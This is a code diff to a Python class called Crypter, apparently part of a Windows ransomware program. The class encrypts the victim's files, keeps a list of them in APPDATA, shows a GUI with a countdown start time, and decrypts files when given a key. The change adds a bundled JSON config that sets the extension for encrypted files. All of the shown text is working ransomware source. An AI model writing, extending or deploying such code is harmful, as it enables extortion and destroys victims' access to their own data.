@@ -13,6 +13,7 @@ import win32event
 import _winreg
 import wx
 import time
+import json
 
 # Import classes
 import Crypt
@@ -34,6 +35,7 @@ class Crypter(Base.Base):
     '''
     @summary: Constructor
     '''
+    self.__config = self.__load_config()
     self.encrypted_file_list = os.path.join(os.environ['APPDATA'], "encrypted_files.txt")
 
     # Init Crypt Lib
@@ -56,6 +58,19 @@ class Crypter(Base.Base):
     elif os.path.isfile(self.encrypted_file_list):
       self.start_gui()
       
+      
+  def __load_config(self):
+      '''
+      @summary: Loads the runtime cfg file
+      @return: JSON runtime config
+      '''
+      cfg_path = os.path.join(sys._MEIPASS, self.RUNTIME_CONFIG_FILE)
+      
+      with open(cfg_path, "r") as runtime_cfg_file:
+          config = json.load(runtime_cfg_file)
+
+      return config
+
       
   def get_start_time(self):
     '''
@@ -109,11 +124,13 @@ class Crypter(Base.Base):
     start_time = self.get_start_time()
     
     app = wx.App()
+    # TODO Update this to new path and place in __init__
     #sys._MEIPASS = "..\\build\\images"
     crypter_gui = Gui.Gui(
         image_path=sys._MEIPASS, 
         start_time=start_time,
-        decrypter=self)
+        decrypter=self,
+        config=self.__config)
                                
     crypter_gui.Show()
     app.MainLoop()
@@ -148,7 +165,7 @@ class Crypter(Base.Base):
       return
 
     # IF successful decryption, delete locked file
-    locked_path = self.Crypt.decrypt_file(encrypted_file.rstrip(), decryption_key)
+    locked_path = self.Crypt.decrypt_file(encrypted_file.rstrip(), decryption_key, self.__config["encrypted_file_extension"])
     if locked_path:
       os.remove(locked_path)
       
@@ -174,7 +191,7 @@ class Crypter(Base.Base):
 
       # Encrypt file if less than specified file size
       if int(os.path.getsize(file)) < self.MAX_FILE_SIZE_BYTES:
-        is_encrypted = self.Crypt.encrypt_file(file)
+        is_encrypted = self.Crypt.encrypt_file(file, self.__config["encrypted_file_extension"])
       else:
         is_encrypted = False
 
